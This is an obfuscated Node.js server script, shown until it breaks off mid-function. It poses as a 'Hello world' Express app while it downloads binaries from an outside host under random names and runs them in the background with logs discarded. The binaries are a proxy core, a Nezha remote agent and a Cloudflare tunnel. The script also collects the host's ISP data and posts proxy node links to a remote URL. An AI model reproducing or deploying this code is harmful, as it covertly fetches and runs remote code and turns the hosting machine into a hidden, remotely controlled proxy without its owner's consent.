const _0x2067f2=_0x15ad;(function(_0x7ef49d,_0x1f8366){const _0x607e4c={_0x16dbb2:0x256,_0x40d28b:0x254,_0x19fa65:0x232,_0x47fd71:0x25b,_0x5a2dca:0x237},_0x5ca432=_0x15ad,_0xa03985=_0x7ef49d();while(!![]){try{const _0x111b5a=parseInt(_0x5ca432(0x274))/0x1+parseInt(_0x5ca432(0x278))/0x2+-parseInt(_0x5ca432(0x282))/0x3*(-parseInt(_0x5ca432(0x1f9))/0x4)+-parseInt(_0x5ca432(_0x607e4c._0x16dbb2))/0x5*(parseInt(_0x5ca432(_0x607e4c._0x40d28b))/0x6)+parseInt(_0x5ca432(_0x607e4c._0x19fa65))/0x7+-parseInt(_0x5ca432(0x27e))/0x8*(-parseInt(_0x5ca432(_0x607e4c._0x47fd71))/0x9)+parseInt(_0x5ca432(_0x607e4c._0x5a2dca))/0xa*(-parseInt(_0x5ca432(0x1f3))/0xb);if(_0x111b5a===_0x1f8366)break;else _0xa03985['push'](_0xa03985['shift']());}catch(_0x332b43){_0xa03985['push'](_0xa03985['shift']());}}}(_0x282b,0x8547e));const express=require('express'),app=express(),axios=require(_0x2067f2(0x2aa)),os=require('os'),fs=require('fs'),path=require(_0x2067f2(0x287)),{promisify}=require(_0x2067f2(0x236)),exec=promisify(require(_0x2067f2(0x2a1))[_0x2067f2(0x261)]),{execSync}=require('child_process'),UPLOAD_URL=process[_0x2067f2(0x253)][_0x2067f2(0x265)]||'',PROJECT_URL=process[_0x2067f2(0x253)][_0x2067f2(0x1ee)]||'',AUTO_ACCESS=process['env'][_0x2067f2(0x247)]||![],FILE_PATH=process[_0x2067f2(0x253)][_0x2067f2(0x24f)]||_0x2067f2(0x2a8),SUB_PATH=process[_0x2067f2(0x253)][_0x2067f2(0x214)]||_0x2067f2(0x267),PORT=process[_0x2067f2(0x253)]['SERVER_PORT']||process['env'][_0x2067f2(0x24b)]||0xbb8,UUID=process['env']['UUID']||_0x2067f2(0x289),NEZHA_SERVER=process['env'][_0x2067f2(0x230)]||'',NEZHA_PORT=process[_0x2067f2(0x253)]['NEZHA_PORT']||'',NEZHA_KEY=process[_0x2067f2(0x253)]['NEZHA_KEY']||'',ARGO_DOMAIN=process[_0x2067f2(0x253)]['ARGO_DOMAIN']||'spacehost1.l53ya.ggff.net',ARGO_AUTH=process['env'][_0x2067f2(0x1fa)]||_0x2067f2(0x28e),ARGO_PORT=process[_0x2067f2(0x253)][_0x2067f2(0x22e)]||0x1f41,CFIP=process[_0x2067f2(0x253)][_0x2067f2(0x284)]||_0x2067f2(0x279),CFPORT=process[_0x2067f2(0x253)][_0x2067f2(0x218)]||0x1bb,NAME=process[_0x2067f2(0x253)][_0x2067f2(0x29b)]||'galaxycloud';!fs[_0x2067f2(0x210)](FILE_PATH)?(fs[_0x2067f2(0x1fc)](FILE_PATH),console[_0x2067f2(0x29f)](FILE_PATH+'\x20is\x20created')):console[_0x2067f2(0x29f)](FILE_PATH+_0x2067f2(0x227));function generateRandomName(){const _0x3e46b2={_0x28a5cc:0x269,_0x53d82d:0x23d},_0x1cf95a=_0x2067f2,_0x3afea9=_0x1cf95a(0x200);let _0xb3921d='';for(let _0x5d7a1d=0x0;_0x5d7a1d<0x6;_0x5d7a1d++){_0xb3921d+=_0x3afea9[_0x1cf95a(0x201)](Math[_0x1cf95a(_0x3e46b2._0x28a5cc)](Math[_0x1cf95a(0x28b)]()*_0x3afea9[_0x1cf95a(_0x3e46b2._0x53d82d)]));}return _0xb3921d;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path[_0x2067f2(0x1ff)](FILE_PATH,npmName),phpPath=path[_0x2067f2(0x1ff)](FILE_PATH,phpName),webPath=path[_0x2067f2(0x1ff)](FILE_PATH,webName),botPath=path[_0x2067f2(0x1ff)](FILE_PATH,botName),subPath=path[_0x2067f2(0x1ff)](FILE_PATH,_0x2067f2(0x23b)),listPath=path[_0x2067f2(0x1ff)](FILE_PATH,_0x2067f2(0x205)),bootLogPath=path[_0x2067f2(0x1ff)](FILE_PATH,_0x2067f2(0x27f)),configPath=path[_0x2067f2(0x1ff)](FILE_PATH,_0x2067f2(0x2a0));function deleteNodes(){const _0x39437f={_0x954ca6:0x210,_0x56ec97:0x281,_0x4769aa:0x246,_0x4b466d:0x208,_0x2102de:0x23d,_0x3f5ed4:0x285,_0x132766:0x26c},_0xe60bf6=_0x2067f2;try{if(!UPLOAD_URL)return;if(!fs[_0xe60bf6(_0x39437f._0x954ca6)](subPath))return;let _0x2d1a55;try{_0x2d1a55=fs[_0xe60bf6(_0x39437f._0x56ec97)](subPath,_0xe60bf6(_0x39437f._0x4769aa));}catch{return null;}const _0x52001c=Buffer['from'](_0x2d1a55,_0xe60bf6(0x266))[_0xe60bf6(0x1f0)]('utf-8'),_0x4d048e=_0x52001c[_0xe60bf6(0x286)]('\x0a')[_0xe60bf6(_0x39437f._0x4b466d)](_0x4319c8=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0xe60bf6(0x2a6)](_0x4319c8));if(_0x4d048e[_0xe60bf6(_0x39437f._0x2102de)]===0x0)return;return axios[_0xe60bf6(0x1f7)](UPLOAD_URL+_0xe60bf6(_0x39437f._0x3f5ed4),JSON['stringify']({'nodes':_0x4d048e}),{'headers':{'Content-Type':_0xe60bf6(_0x39437f._0x132766)}})[_0xe60bf6(0x211)](_0x5085e6=>{return null;}),null;}catch(_0xc73173){return null;}}function cleanupOldFiles(){const _0x4ff4e8={_0x4a1159:0x298},_0x3fa145=_0x2067f2;try{const _0x2a055d=fs[_0x3fa145(0x277)](FILE_PATH);_0x2a055d[_0x3fa145(0x248)](_0x44db0e=>{const _0x5e2705=_0x3fa145,_0x5156e3=path[_0x5e2705(0x1ff)](FILE_PATH,_0x44db0e);try{const _0x5c8d5b=fs[_0x5e2705(0x241)](_0x5156e3);_0x5c8d5b[_0x5e2705(0x27d)]()&&fs[_0x5e2705(_0x4ff4e8._0x4a1159)](_0x5156e3);}catch(_0x220f8c){}});}catch(_0x2bff04){}}app[_0x2067f2(0x2a5)]('/',function(_0x40a285,_0x36f94c){const _0x4d6ef9=_0x2067f2;_0x36f94c[_0x4d6ef9(0x220)]('Hello\x20world!');});function _0x15ad(_0x4d31ab,_0x547bf5){const _0x282b9b=_0x282b();return _0x15ad=function(_0x15ad62,_0x29d1af){_0x15ad62=_0x15ad62-0x1ec;let _0x5890b2=_0x282b9b[_0x15ad62];return _0x5890b2;},_0x15ad(_0x4d31ab,_0x547bf5);}async function generateConfig(){const _0x1bd79d={_0x58bd17:0x204,_0x2078d1:0x271,_0x3b055b:0x1ec,_0x5dfb87:0x299,_0x507890:0x271,_0x1322a0:0x244,_0x5653b6:0x276,_0x1e8690:0x240,_0x5318d4:0x223,_0x2a8411:0x21e,_0x20b434:0x1f5,_0x5e7e9f:0x24e,_0xcc896b:0x28c,_0x3c8e71:0x1ff},_0x2627d5=_0x2067f2,_0x126229={'log':{'access':'/dev/null','error':'/dev/null','loglevel':_0x2627d5(0x1ec)},'inbounds':[{'port':ARGO_PORT,'protocol':'vless','settings':{'clients':[{'id':UUID,'flow':'xtls-rprx-vision'}],'decryption':'none','fallbacks':[{'dest':0xbb9},{'path':_0x2627d5(_0x1bd79d._0x58bd17),'dest':0xbba},{'path':'/vmess-argo','dest':0xbbb},{'path':'/trojan-argo','dest':0xbbc}]},'streamSettings':{'network':'tcp'}},{'port':0xbb9,'listen':'127.0.0.1','protocol':_0x2627d5(_0x1bd79d._0x2078d1),'settings':{'clients':[{'id':UUID}],'decryption':_0x2627d5(_0x1bd79d._0x3b055b)},'streamSettings':{'network':_0x2627d5(_0x1bd79d._0x5dfb87),'security':_0x2627d5(_0x1bd79d._0x3b055b)}},{'port':0xbba,'listen':_0x2627d5(0x223),'protocol':_0x2627d5(_0x1bd79d._0x507890),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x2627d5(0x1ec)},'streamSettings':{'network':'ws','security':'none','wsSettings':{'path':_0x2627d5(_0x1bd79d._0x58bd17)}},'sniffing':{'enabled':!![],'destOverride':[_0x2627d5(_0x1bd79d._0x1322a0),_0x2627d5(_0x1bd79d._0x5653b6),_0x2627d5(0x1f5)],'metadataOnly':![]}},{'port':0xbbb,'listen':'127.0.0.1','protocol':_0x2627d5(_0x1bd79d._0x1e8690),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':'/vmess-argo'}},'sniffing':{'enabled':!![],'destOverride':[_0x2627d5(0x244),_0x2627d5(0x276),'quic'],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x2627d5(_0x1bd79d._0x5318d4),'protocol':'trojan','settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':'none','wsSettings':{'path':_0x2627d5(_0x1bd79d._0x2a8411)}},'sniffing':{'enabled':!![],'destOverride':[_0x2627d5(_0x1bd79d._0x1322a0),_0x2627d5(_0x1bd79d._0x5653b6),_0x2627d5(_0x1bd79d._0x20b434)],'metadataOnly':![]}}],'dns':{'servers':[_0x2627d5(_0x1bd79d._0x5e7e9f)]},'outbounds':[{'protocol':'freedom','tag':_0x2627d5(0x2a2)},{'protocol':'blackhole','tag':_0x2627d5(0x1f6)}]};fs[_0x2627d5(_0x1bd79d._0xcc896b)](path[_0x2627d5(_0x1bd79d._0x3c8e71)](FILE_PATH,_0x2627d5(0x2a0)),JSON[_0x2627d5(0x209)](_0x126229,null,0x2));}function getSystemArchitecture(){const _0x58646c={_0x1b82b2:0x1f2,_0x4a72fb:0x23f,_0x16cb8d:0x21b},_0x41d6dd=_0x2067f2,_0x4cb1f6=os[_0x41d6dd(_0x58646c._0x1b82b2)]();return _0x4cb1f6===_0x41d6dd(_0x58646c._0x4a72fb)||_0x4cb1f6===_0x41d6dd(_0x58646c._0x16cb8d)||_0x4cb1f6===_0x41d6dd(0x29d)?_0x41d6dd(0x23f):'amd';}function downloadFile(_0x2bf5ef,_0x39e827,_0x321a5e){const _0x39c443={_0x28b30d:0x210,_0x1321b7:0x22f,_0x4d055e:0x2a5,_0xa2e851:0x20a},_0x1bebd0={_0x5a7a6e:0x252},_0x45b3a1={_0x4f250a:0x233,_0x2a4151:0x1f1,_0x2a0225:0x25a},_0x59de82=_0x2067f2,_0xa74199=_0x2bf5ef;!fs[_0x59de82(_0x39c443._0x28b30d)](FILE_PATH)&&fs['mkdirSync'](FILE_PATH,{'recursive':!![]});const _0x18e26d=fs[_0x59de82(_0x39c443._0x1321b7)](_0xa74199);axios({'method':_0x59de82(_0x39c443._0x4d055e),'url':_0x39e827,'responseType':'stream'})[_0x59de82(_0x39c443._0xa2e851)](_0xaab638=>{const _0x10069f={_0x14cc64:0x243,_0x5c44e8:0x29f,_0x24ff25:0x268},_0xe5895e=_0x59de82;_0xaab638[_0xe5895e(_0x45b3a1._0x4f250a)][_0xe5895e(_0x45b3a1._0x2a4151)](_0x18e26d),_0x18e26d['on'](_0xe5895e(_0x45b3a1._0x2a0225),()=>{const _0x2a328f=_0xe5895e;_0x18e26d[_0x2a328f(_0x10069f._0x14cc64)](),console[_0x2a328f(_0x10069f._0x5c44e8)](_0x2a328f(0x235)+path[_0x2a328f(_0x10069f._0x24ff25)](_0xa74199)+'\x20successfully'),_0x321a5e(null,_0xa74199);}),_0x18e26d['on']('error',_0x1eff1e=>{const _0x321c72=_0xe5895e;fs[_0x321c72(0x22d)](_0xa74199,()=>{});const _0x1f2bc2=_0x321c72(0x235)+path[_0x321c72(0x268)](_0xa74199)+'\x20failed:\x20'+_0x1eff1e['message'];console[_0x321c72(0x21c)](_0x1f2bc2),_0x321a5e(_0x1f2bc2);});})[_0x59de82(0x211)](_0x33dff1=>{const _0x3bfc33=_0x59de82,_0x1d88c3=_0x3bfc33(0x235)+path['basename'](_0xa74199)+_0x3bfc33(_0x1bebd0._0x5a7a6e)+_0x33dff1['message'];console['error'](_0x1d88c3),_0x321a5e(_0x1d88c3);});}async function downloadFilesAndRun(){const _0x2878b4={_0x3605c5:0x26a,_0x1e8191:0x1f4,_0x5ca940:0x249,_0x1f2ca7:0x20b,_0x1c26ae:0x226,_0x32c50c:0x292,_0x4e6778:0x22c,_0x426d3d:0x1f8,_0x221d58:0x29c,_0x58eed2:0x21a,_0x7831b1:0x20d,_0x2f4b21:0x20c,_0x290a06:0x21c,_0x546fb2:0x29e,_0x23202b:0x234,_0x58c50a:0x226,_0x49728d:0x1f4,_0x28ab62:0x295,_0x52fb72:0x29f,_0x46185e:0x21c,_0x2bbe59:0x28f,_0x49ea12:0x288,_0x1264c0:0x27c,_0x515518:0x21a,_0x4f1200:0x27b,_0x38b4cb:0x250},_0x43c648=_0x2067f2,_0x1bea9d=getSystemArchitecture(),_0x107132=getFilesForArchitecture(_0x1bea9d);if(_0x107132[_0x43c648(0x23d)]===0x0){console[_0x43c648(0x29f)](_0x43c648(0x23e));return;}const _0x49763e=_0x107132['map'](_0x44d74a=>{const _0x487241={_0x5868bb:0x23a,_0x409e3d:0x257};return new Promise((_0x19957b,_0x3c9f72)=>{const _0x425fc7=_0x15ad;downloadFile(_0x44d74a[_0x425fc7(_0x487241._0x5868bb)],_0x44d74a[_0x425fc7(_0x487241._0x409e3d)],(_0x28300e,_0x3df02c)=>{_0x28300e?_0x3c9f72(_0x28300e):_0x19957b(_0x3df02c);});});});try{await Promise[_0x43c648(_0x2878b4._0x3605c5)](_0x49763e);}catch(_0x30bac2){console['error'](_0x43c648(0x26e),_0x30bac2);return;}function _0x1e9631(_0x176c88){const _0x170450={_0x45f000:0x210,_0x391cbc:0x24c},_0x2dfd90={_0x1000f0:0x21c,_0x2d23c2:0x1fd},_0x27836a=0x1fd;_0x176c88['forEach'](_0x53a27e=>{const _0x480341=_0x15ad;fs[_0x480341(_0x170450._0x45f000)](_0x53a27e)&&fs[_0x480341(_0x170450._0x391cbc)](_0x53a27e,_0x27836a,_0x3e3c75=>{const _0x3df8b7=_0x480341;_0x3e3c75?console[_0x3df8b7(_0x2dfd90._0x1000f0)](_0x3df8b7(_0x2dfd90._0x2d23c2)+_0x53a27e+':\x20'+_0x3e3c75):console[_0x3df8b7(0x29f)]('Empowerment\x20success\x20for\x20'+_0x53a27e+':\x20'+_0x27836a['toString'](0x8));});});}const _0x392be5=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x1e9631(_0x392be5);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x4fb866=NEZHA_SERVER[_0x43c648(_0x2878b4._0x1e8191)](':')?NEZHA_SERVER[_0x43c648(0x286)](':')[_0x43c648(_0x2878b4._0x5ca940)]():'',_0x1a01fc=new Set([_0x43c648(_0x2878b4._0x1f2ca7),'8443',_0x43c648(0x25f),'2087',_0x43c648(0x234),_0x43c648(_0x2878b4._0x1c26ae)]),_0x525dfc=_0x1a01fc[_0x43c648(0x231)](_0x4fb866)?_0x43c648(_0x2878b4._0x32c50c):_0x43c648(0x21d),_0xb691d1=_0x43c648(_0x2878b4._0x4e6778)+NEZHA_KEY+_0x43c648(_0x2878b4._0x426d3d)+NEZHA_SERVER+_0x43c648(_0x2878b4._0x221d58)+_0x525dfc+'\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20'+UUID;fs[_0x43c648(0x28c)](path[_0x43c648(0x1ff)](FILE_PATH,_0x43c648(0x1fe)),_0xb691d1);const _0x2194e4=_0x43c648(_0x2878b4._0x58eed2)+phpPath+_0x43c648(_0x2878b4._0x7831b1)+FILE_PATH+_0x43c648(_0x2878b4._0x2f4b21);try{await exec(_0x2194e4),console[_0x43c648(0x29f)](phpName+'\x20is\x20running'),await new Promise(_0x2b9b72=>setTimeout(_0x2b9b72,0x3e8));}catch(_0x13e032){console[_0x43c648(_0x2878b4._0x290a06)]('php\x20running\x20error:\x20'+_0x13e032);}}else{let _0x31d548='';const _0xc65c80=[_0x43c648(0x20b),_0x43c648(0x264),_0x43c648(0x25f),_0x43c648(_0x2878b4._0x546fb2),_0x43c648(_0x2878b4._0x23202b),_0x43c648(_0x2878b4._0x58c50a)];_0xc65c80[_0x43c648(_0x2878b4._0x49728d)](NEZHA_PORT)&&(_0x31d548=_0x43c648(_0x2878b4._0x28ab62));const _0x58d8ef=_0x43c648(0x21a)+npmPath+'\x20-s\x20'+NEZHA_SERVER+':'+NEZHA_PORT+_0x43c648(0x224)+NEZHA_KEY+'\x20'+_0x31d548+'\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&';try{await exec(_0x58d8ef),console[_0x43c648(_0x2878b4._0x52fb72)](npmName+'\x20is\x20running'),await new Promise(_0x18f318=>setTimeout(_0x18f318,0x3e8));}catch(_0xd642c3){console[_0x43c648(_0x2878b4._0x46185e)]('npm\x20running\x20error:\x20'+_0xd642c3);}}}else console[_0x43c648(_0x2878b4._0x52fb72)]('NEZHA\x20variable\x20is\x20empty,skip\x20running');const _0x1458ab='nohup\x20'+webPath+_0x43c648(_0x2878b4._0x2bbe59)+FILE_PATH+_0x43c648(0x2a9);try{await exec(_0x1458ab),console['log'](webName+_0x43c648(_0x2878b4._0x49ea12)),await new Promise(_0x33fd40=>setTimeout(_0x33fd40,0x3e8));}catch(_0x1b3625){console[_0x43c648(_0x2878b4._0x290a06)](_0x43c648(_0x2878b4._0x1264c0)+_0x1b3625);}if(fs[_0x43c648(0x210)](botPath)){let _0x4a4f70;if(ARGO_AUTH[_0x43c648(0x25d)](/^[A-Z0-9a-z=]{120,250}$/))_0x4a4f70='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20'+ARGO_AUTH;else ARGO_AUTH['match'](/TunnelSecret/)?_0x4a4f70=_0x43c648(0x207)+FILE_PATH+'/tunnel.yml\x20run':_0x4a4f70='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20'+FILE_PATH+_0x43c648(0x255)+ARGO_PORT;try{await exec(_0x43c648(_0x2878b4._0x515518)+botPath+'\x20'+_0x4a4f70+_0x43c648(_0x2878b4._0x4f1200)),console[_0x43c648(0x29f)](botName+_0x43c648(_0x2878b4._0x49ea12)),await new Promise(_0x339b57=>setTimeout(_0x339b57,0x7d0));}catch(_0x19ccdf){console['error'](_0x43c648(_0x2878b4._0x38b4cb)+_0x19ccdf);}}await new Promise(_0x4ed99e=>setTimeout(_0x4ed99e,0x1388));}function getFilesForArchitecture(_0x1192f3){const _0xec5c72={_0x48a7d9:0x1ef,_0x64e2db:0x23f,_0x2ab051:0x293},_0x5daa45=_0x2067f2;let _0x415f8c;_0x1192f3==='arm'?_0x415f8c=[{'fileName':webPath,'fileUrl':_0x5daa45(0x272)},{'fileName':botPath,'fileUrl':_0x5daa45(0x245)}]:_0x415f8c=[{'fileName':webPath,'fileUrl':'https://amd64.ssss.nyc.mn/web'},{'fileName':botPath,'fileUrl':_0x5daa45(0x22b)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x3ebb83=_0x1192f3===_0x5daa45(0x23f)?_0x5daa45(_0xec5c72._0x48a7d9):'https://amd64.ssss.nyc.mn/agent';_0x415f8c['unshift']({'fileName':npmPath,'fileUrl':_0x3ebb83});}else{const _0x49b3db=_0x1192f3===_0x5daa45(_0xec5c72._0x64e2db)?'https://arm64.ssss.nyc.mn/v1':_0x5daa45(_0xec5c72._0x2ab051);_0x415f8c['unshift']({'fileName':phpPath,'fileUrl':_0x49b3db});}}return _0x415f8c;}function argoType(){const _0x513ad0={_0x516279:0x28a,_0x5541f9:0x1f4,_0x3d810d:0x28c,_0x5ec22e:0x219,_0x48f06b:0x251,_0x55aa7f:0x275,_0xc66b9b:0x26b},_0x4ac260=_0x2067f2;if(!ARGO_AUTH||!ARGO_DOMAIN){console['log'](_0x4ac260(_0x513ad0._0x516279));return;}if(ARGO_AUTH[_0x4ac260(_0x513ad0._0x5541f9)]('TunnelSecret')){fs[_0x4ac260(_0x513ad0._0x3d810d)](path[_0x4ac260(0x1ff)](FILE_PATH,_0x4ac260(0x213)),ARGO_AUTH);const _0x205ec3=_0x4ac260(0x228)+ARGO_AUTH['split']('\x22')[0xb]+_0x4ac260(_0x513ad0._0x5ec22e)+path['join'](FILE_PATH,_0x4ac260(0x213))+_0x4ac260(_0x513ad0._0x48f06b)+ARGO_DOMAIN+_0x4ac260(_0x513ad0._0x55aa7f)+ARGO_PORT+'\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20';fs[_0x4ac260(0x28c)](path[_0x4ac260(0x1ff)](FILE_PATH,_0x4ac260(0x280)),_0x205ec3);}else console[_0x4ac260(0x29f)](_0x4ac260(_0x513ad0._0xc66b9b));}async function extractDomains(){const _0x54e8af={_0x49e2d9:0x1ff,_0x40cd50:0x286,_0x39c59f:0x248,_0x584f0e:0x258,_0x51eea8:0x298,_0x155586:0x21a,_0x2bc78d:0x21c,_0x12bec7:0x250,_0x1bf0e0:0x262},_0x1510e7={_0x48c7f2:0x2a5,_0x22a618:0x233,_0x13cb5e:0x22a,_0x42ce99:0x233,_0x55c4d7:0x233,_0x4debc4:0x233,_0x4e4137:0x26d,_0x585b3b:0x26d,_0x3b752d:0x233},_0x1221b4={_0x3ca48c:0x242,_0x23087a:0x1ed,_0x330e4e:0x201,_0x1e3be9:0x24d},_0x1a996c=_0x2067f2;let _0x1fd8ac;if(ARGO_AUTH&&ARGO_DOMAIN)_0x1fd8ac=ARGO_DOMAIN,console['log'](_0x1a996c(0x270),_0x1fd8ac),await _0x294ea2(_0x1fd8ac);else try{const _0x267914=fs[_0x1a996c(0x281)](path[_0x1a996c(_0x54e8af._0x49e2d9)](FILE_PATH,'boot.log'),_0x1a996c(0x246)),_0xf3a982=_0x267914[_0x1a996c(_0x54e8af._0x40cd50)]('\x0a'),_0x11b25b=[];_0xf3a982[_0x1a996c(_0x54e8af._0x39c59f)](_0x1f5b1f=>{const _0x5eb3a4=_0x1a996c,_0x4dd14a=_0x1f5b1f[_0x5eb3a4(0x25d)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x4dd14a){const _0x44fea6=_0x4dd14a[0x1];_0x11b25b['push'](_0x44fea6);}});if(_0x11b25b['length']>0x0)_0x1fd8ac=_0x11b25b[0x0],console['log'](_0x1a996c(0x29a),_0x1fd8ac),await _0x294ea2(_0x1fd8ac);else{console[_0x1a996c(0x29f)](_0x1a996c(_0x54e8af._0x584f0e)),fs[_0x1a996c(_0x54e8af._0x51eea8)](path['join'](FILE_PATH,_0x1a996c(0x27f)));async function _0x56771b(){const _0x59b10f=_0x1a996c;try{process[_0x59b10f(_0x1221b4._0x3ca48c)]===_0x59b10f(0x225)?await exec(_0x59b10f(0x217)+botName+_0x59b10f(_0x1221b4._0x23087a)):await exec('pkill\x20-f\x20\x22['+botName[_0x59b10f(_0x1221b4._0x330e4e)](0x0)+']'+botName['substring'](0x1)+_0x59b10f(_0x1221b4._0x1e3be9));}catch(_0x3eea56){}}_0x56771b(),await new Promise(_0x3069ed=>setTimeout(_0x3069ed,0xbb8));const _0x551fcf='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20'+FILE_PATH+'/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:'+ARGO_PORT;try{await exec(_0x1a996c(_0x54e8af._0x155586)+botPath+'\x20'+_0x551fcf+_0x1a996c(0x27b)),console[_0x1a996c(0x29f)](botName+'\x20is\x20running'),await new Promise(_0x497261=>setTimeout(_0x497261,0xbb8)),await extractDomains();}catch(_0x2c72a0){console[_0x1a996c(_0x54e8af._0x2bc78d)](_0x1a996c(_0x54e8af._0x12bec7)+_0x2c72a0);}}}catch(_0x28e2f6){console[_0x1a996c(0x21c)](_0x1a996c(_0x54e8af._0x1bf0e0),_0x28e2f6);}async function _0x39373e(){const _0x177f7b=_0x1a996c;try{const _0x58b198=await axios[_0x177f7b(_0x1510e7._0x48c7f2)](_0x177f7b(0x283),{'timeout':0xbb8});if(_0x58b198[_0x177f7b(0x233)]&&_0x58b198[_0x177f7b(_0x1510e7._0x22a618)][_0x177f7b(_0x1510e7._0x13cb5e)]&&_0x58b198[_0x177f7b(_0x1510e7._0x42ce99)][_0x177f7b(0x24a)])return _0x58b198[_0x177f7b(0x233)][_0x177f7b(_0x1510e7._0x13cb5e)]+'_'+_0x58b198[_0x177f7b(_0x1510e7._0x55c4d7)][_0x177f7b(0x24a)];}catch(_0x26f70c){try{const _0x1f3b7c=await axios[_0x177f7b(_0x1510e7._0x48c7f2)](_0x177f7b(0x28d),{'timeout':0xbb8});if(_0x1f3b7c[_0x177f7b(_0x1510e7._0x4debc4)]&&_0x1f3b7c[_0x177f7b(0x233)][_0x177f7b(0x259)]==='success'&&_0x1f3b7c[_0x177f7b(_0x1510e7._0x4debc4)][_0x177f7b(_0x1510e7._0x4e4137)]&&_0x1f3b7c[_0x177f7b(_0x1510e7._0x22a618)][_0x177f7b(0x24a)])return _0x1f3b7c[_0x177f7b(_0x1510e7._0x55c4d7)][_0x177f7b(_0x1510e7._0x585b3b)]+'_'+_0x1f3b7c[_0x177f7b(_0x1510e7._0x3b752d)]['org'];}catch(_0x5780f9){}}return'Unknown';}async function _0x294ea2(_0xb30f17){const _0x1896e0={_0xbc3ea9:0x25c,_0x67d28b:0x291,_0x55785c:0x212,_0x5df699:0x206,_0x5ce78c:0x263,_0x28f73d:0x215,_0x5b9da3:0x28c,_0x30e42b:0x1f0},_0x571d33=await _0x39373e(),_0x15b6da=NAME?NAME+'-'+_0x571d33:_0x571d33;return new Promise(_0x4a020f=>{const _0x209c56={_0xbd8ca7:0x297};setTimeout(()=>{const _0x59b0ca=_0x15ad,_0x1d7bd2={'v':'2','ps':''+_0x15b6da,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':'none','net':'ws','type':'none','host':_0xb30f17,'path':'/vmess-argo?ed=2560','tls':'tls','sni':_0xb30f17,'alpn':'','fp':_0x59b0ca(0x296)},_0xfd753d=_0x59b0ca(0x23c)+UUID+'@'+CFIP+':'+CFPORT+_0x59b0ca(_0x1896e0._0xbc3ea9)+_0xb30f17+_0x59b0ca(0x215)+_0xb30f17+_0x59b0ca(_0x1896e0._0x67d28b)+_0x15b6da+_0x59b0ca(_0x1896e0._0x55785c)+Buffer[_0x59b0ca(_0x1896e0._0x5df699)](JSON[_0x59b0ca(0x209)](_0x1d7bd2))['toString'](_0x59b0ca(0x266))+_0x59b0ca(_0x1896e0._0x5ce78c)+UUID+'@'+CFIP+':'+CFPORT+_0x59b0ca(0x202)+_0xb30f17+_0x59b0ca(_0x1896e0._0x28f73d)+_0xb30f17+'&path=%2Ftrojan-argo%3Fed%3D2560#'+_0x15b6da+_0x59b0ca(0x2a4);console['log'](Buffer[_0x59b0ca(0x206)](_0xfd753d)[_0x59b0ca(0x1f0)](_0x59b0ca(0x266))),fs[_0x59b0ca(_0x1896e0._0x5b9da3)](subPath,Buffer[_0x59b0ca(0x206)](_0xfd753d)[_0x59b0ca(_0x1896e0._0x30e42b)](_0x59b0ca(0x266))),console['log'](FILE_PATH+'/sub.txt\x20saved\x20successfully'),uploadNodes(),app['get']('/'+SUB_PATH,(_0x53d56a,_0x9818ff)=>{const _0x4ee0c4=_0x59b0ca,_0x43f8eb=Buffer['from'](_0xfd753d)['toString'](_0x4ee0c4(0x266));_0x9818ff['set'](_0x4ee0c4(_0x209c56._0xbd8ca7),_0x4ee0c4(0x238)),_0x9818ff[_0x4ee0c4(0x220)](_0x43f8eb);}),_0x4a020f(_0xfd753d);},0x7d0);});}}async function uploadNodes(){const _0x39d91c={_0x4684ac:0x1f7,_0x360d5f:0x29f,_0xfee2cd:0x25e,_0xb6282e:0x286},_0x229e99=_0x2067f2;if(UPLOAD_URL&&PROJECT_URL){const _0x418ec1=PROJECT_URL+'/'+SUB_PATH,_0x1ed785={'subscription':[_0x418ec1]};try{const _0x7cf64b=await axios[_0x229e99(_0x39d91c._0x4684ac)](UPLOAD_URL+_0x229e99(0x216),_0x1ed785,{'headers':{'Content-Type':_0x229e99(0x26c)}});return _0x7cf64b&&_0x7cf64b[_0x229e99(0x259)]===0xc8?(console[_0x229e99(_0x39d91c._0x360d5f)](_0x229e99(_0x39d91c._0xfee2cd)),_0x7cf64b):null;}catch(_0x4f3118){if(_0x4f3118[_0x229e99(0x21f)]){if(_0x4f3118[_0x229e99(0x21f)][_0x229e99(0x259)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x229e99(0x210)](listPath))return;const _0x383798=fs[_0x229e99(0x281)](listPath,'utf-8'),_0x379a73=_0x383798[_0x229e99(_0x39d91c._0xb6282e)]('\x0a')[_0x229e99(0x208)](_0x28b124=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x229e99(0x2a6)](_0x28b124));if(_0x379a73[_0x229e99(0x23d)]===0x0)return;const _0x5c783f=JSON['stringify']({'nodes':_0x379a73});try{const _0xe1129b=await axios[_0x229e99(_0x39d91c._0x4684ac)](UPLOAD_URL+'/api/add-nodes',_0x5c783f,{'headers':{'Content-Type':'application/json'}});return _0xe1129b&&_0xe1129b[_0x229e99(0x259)]===0xc8?(console[_0x229e99(0x29f)](_0x229e99(0x290)),_0xe1129b):null;}catch(_0x192779){return null;}}else return;}}function cleanFiles(){const 